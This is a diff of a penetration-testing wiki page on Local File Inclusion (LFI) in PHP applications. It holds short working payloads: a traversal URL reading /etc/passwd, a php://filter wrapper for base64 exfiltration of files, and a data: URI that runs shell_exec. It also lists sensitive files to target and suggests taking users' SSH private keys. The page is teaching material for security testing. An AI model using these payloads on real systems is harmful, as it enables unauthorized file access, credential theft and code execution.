@@ -1,28 +1,36 @@
----
-description: >-
-  A remote file inclusion vulnerability allows an attacker to remotely execute a
-  script on the target machine even if it's not available locally.
----
-
 # Local File Inclusion (LFI)
 
-### Example
+### Description
 
-If we want to get a file then it is best to base64 encode it. This will ensure that we can exfiltrate files rather than have Apache read the file. This can be accomplished with the following command:
+A local file inclusion (LFI) vulnerability is the process of including files that are locally present on the target server, through exploitation of vulnerable inclusion procedures implemented in the application.
 
-```php
-php://filter/convert.base64-encode/resource=[FILE]
-```
+Local file inclusion vulnerabilites occur when a page receives the path to the file that has to be included as input, which is not properly sanitized, allowing directory traversal characters to be injected.
 
-Additionally, the following command demonstrates  how we could execute code if&#x20;
+### Examples
+
+The most basic form of a exploiting a LFI vulnerability looks like the following:
 
 ```bash
-data:text/plain,<?php echo shell_exec("dir") ?>
+https://mysecureserver.com/file.php?target=../../../../../etc/passwd
 ```
 
-The sections following lists common but interesting files to look at when testing for Local File Inclusion:
+If we want to get a file,  it is best to base64 encode it. This will ensure that we can exfiltrate files rather than the server excuting the file. This can be accomplished with the following command:
 
-### Linux
+```php
+php://filter/convert.base64-encode/resource=$file
+```
+
+Additionally, the following command demonstrates  how we could execute code with the `shell_exec` function:
+
+```bash
+data:text/plain,<?php echo shell_exec("whoami") ?>
+```
+
+### Common Locations
+
+This section lists common files to look for when testing for Local File Inclusion, I have linked additional lists in the 'References' section.&#x20;
+
+#### Linux
 
 ```
 /etc/issue
@@ -37,7 +45,7 @@ The sections following lists common but interesting files to look at when testin
 /var/spool/cron/crontabs/root
 ```
 
-### Windows
+#### Windows
 
 ```
 %SYSTEMROOT%repairsystem
@@ -48,7 +56,7 @@ The sections following lists common but interesting files to look at when testin
 %WINDIR%system32configAppEvent.Evt
 ```
 
-### OSX
+#### OSX
 
 ```
 %SYSTEMROOT%repairsystem
@@ -62,9 +70,9 @@ The sections following lists common but interesting files to look at when testin
 
 ### Additional Notes
 
-* Sometimes during Local File Inclusion, the web server appends something like ‘.php’ or '.config' to the included file. For example, including ‘/etc/passwd’ gets rendered as ‘/etc/passwd.php’. This occurs when the include function uses a parameter like _?page_ and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page. Additionally, this can be observed if you're host a SimpleHTTPServer with Python.
-* If you have LFI on a Linux host, you may be able to access the `.ssh/id_rsa` file of any identified users.
+* Sometimes during Local File Inclusion, the web server may append something like `.php` or `.config` to the file. For example, including `/etc/passwd` may be rendered as `/etc/passwd.php`. This occurs when the include function uses a parameter like `?page` and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (`%00`) will cause the interpreter to stop reading, this would then allow you to include and view the intended page.
+* If you have identified LFI impacting a Linux host, you may be able to access the `.ssh/id_rsa` file of identified users. These are easily identified from reading the contents of the `/etc/passwd` file.&#x20;
 
 ### References
 
-{% embed url="https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities" %}
+{% embed url="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" %}
